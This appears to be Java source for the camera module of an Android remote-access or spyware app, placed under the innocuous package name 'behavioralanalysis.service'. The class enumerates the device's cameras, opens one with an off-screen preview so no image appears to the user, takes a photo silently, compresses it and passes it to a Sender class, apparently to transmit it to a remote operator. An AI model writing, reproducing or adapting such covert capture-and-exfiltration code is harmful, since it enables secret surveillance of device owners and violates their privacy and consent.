package com.behavioralanalysis.service;

import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;

public class Cameras {
    private Context context;
    private Camera camera;

    public Cameras(Context context) {
        this.context = context;
    }

    public void startUp(int cameraId) {
        camera = Camera.open(cameraId);
        Camera.Parameters parameters = camera.getParameters();
        camera.setParameters(parameters);
        try {
            camera.setPreviewTexture(new SurfaceTexture(0));
            camera.startPreview();
        } catch (Exception e) {
            e.printStackTrace();
        }

        camera.takePicture(null, null, new Camera.PictureCallback() {
            @Override
            public void onPictureTaken(byte[] data, Camera camera) {
                releaseCamera();
                sendPhoto(data);
            }
        });
    }

    public JSONObject get() {
        if (!context.getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA)) {
            return null;
        }

        JSONObject result = null;

        try {
            JSONArray cameras = new JSONArray();
            int camerasCount = Camera.getNumberOfCameras();
            for (int i = 0; i < camerasCount; i++) {
                Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
                Camera.getCameraInfo(i, cameraInfo);
                JSONObject camera = new JSONObject();
                if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
                    camera.put("name", "FRONT");
                    camera.put("id", i);
                } else if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_BACK) {
                    camera.put("name", "Back");
                    camera.put("id", i);
                } else {
                    camera.put("name", "Other");
                    camera.put("id", i);
                }
                cameras.put(camera);
            }
            result = new JSONObject();
            result.put("camList", true);
            result.put("list", cameras);
        } catch (JSONException e) {
            e.printStackTrace();
        }

        return result;
    }

    private void releaseCamera() {
        if (camera != null) {
            camera.stopPreview();
            camera.release();
            camera = null;
        }
    }

    private void sendPhoto(byte[] data) {
        try {
            Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
            ByteArrayOutputStream stream = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.JPEG, 20, stream);
            JSONObject object = new JSONObject();
            object.put("image", true);
            object.put("buffer", stream.toByteArray());

            Sender.send(object);
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }
}
